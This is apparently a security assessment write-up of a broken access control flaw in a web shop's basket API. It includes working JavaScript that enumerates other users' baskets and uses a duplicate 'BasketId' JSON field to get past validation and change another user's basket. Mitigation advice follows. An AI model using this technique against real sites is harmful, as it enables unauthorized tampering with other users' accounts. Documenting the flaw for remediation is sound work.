### **Methodology**

1. **Interception of Request**
   - Used DevTools to capture the `POST` request sent to `/api/BasketItems/` when adding a product to the basket.
   - The intercepted request revealed a `BasketId` field in the request body.

2. **Scanning for Other Baskets**
   - Scanned existing baskets to identify other users' baskets using the following script:
     ```js
     const token = localStorage.getItem('token');

     for (let id = 1; id <= 10; id++) {
       fetch(`/rest/basket/${id}`, {
         headers: {'Authorization': 'Bearer ' + token},
         credentials: 'include'
       }).then(r => r.json()).then(data => {
         if (data.status === 'success') console.log(`BasketId ${id}:`, data)
       })
     }
     ```
   - Found that `BasketId 2` belongs to another user.

3. **Bypassing Validation**
   - Discovered that sending a duplicate `BasketId` field in the JSON body bypasses the server's validation:
     - The validator checks the first `BasketId` (the authenticated user's), but the server processes the second `BasketId` (target user's).
   - Constructed a modified `POST` request using the `fetch` API:
     ```js
     fetch('/api/BasketItems/', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
         'Authorization': 'Bearer ' + token
       },
       body: '{"ProductId":6,"BasketId":7,"BasketId":2,"quantity":1}',
       credentials: 'include'
     }).then(r => r.json()).then(console.log)
     ```

4. **Tools Used**
   - **Browser DevTools** (for intercepting requests and scanning baskets)
   - **JavaScript `fetch` API** (for sending the modified request)
   - **Local Storage** (to retrieve the authentication token)

---
### **Vulnerabilities**

1. **Vulnerability Name**
   - **Broken Access Control** (CWE-284)

2. **Affected Components**
   - **Shopping Basket System** (specifically the `/api/BasketItems/` endpoint)

3. **Severity Level**
   - **High**
     - Allows unauthorized users to manipulate other users' shopping baskets, potentially leading to fraud or user confusion.

---
### **Risks**

1. **Business Impact**
   - **Financial Loss**: Attackers could add unwanted items to other users' baskets, leading to incorrect charges or disputes.
   - **User Experience**: Users may be confused or frustrated by unexpected items in their baskets.
   - **Reputational Damage**: The platform's credibility may be compromised if users realize their baskets can be manipulated.

2. **Exploitation Potential**
   - Attackers can add items to other users' baskets without their consent.
   - The vulnerability can be chained with other attacks (e.g., phishing) to escalate impact.

---
### **Actions**

#### **Risk Mitigation Strategies**
- **Server-Side Validation**: Ensure the `BasketId` field in basket item submissions matches the authenticated user's basket ID.
- **Input Sanitization**: Validate and sanitize all user inputs, especially those involving sensitive operations like basket modifications.
- **Authentication Checks**: Implement robust authentication checks to verify user ownership of the basket.

#### **Remediation Fixes**
- **Backend Modifications**:
  - Add middleware to validate the `BasketId` field against the authenticated user's session data.
  - Ensure the server-side logic enforces ownership of basket modifications.
- **Database Constraints**:
  - Add constraints to prevent unauthorized modifications to basket data.

#### **Best Security Practices**
- **Principle of Least Privilege**: Ensure users can only perform actions they are authorized for.
- **Regular Audits**: Conduct regular security audits to identify and fix similar vulnerabilities.
- **User Education**: Educate users about the risks of sharing sensitive information and the importance of strong authentication.
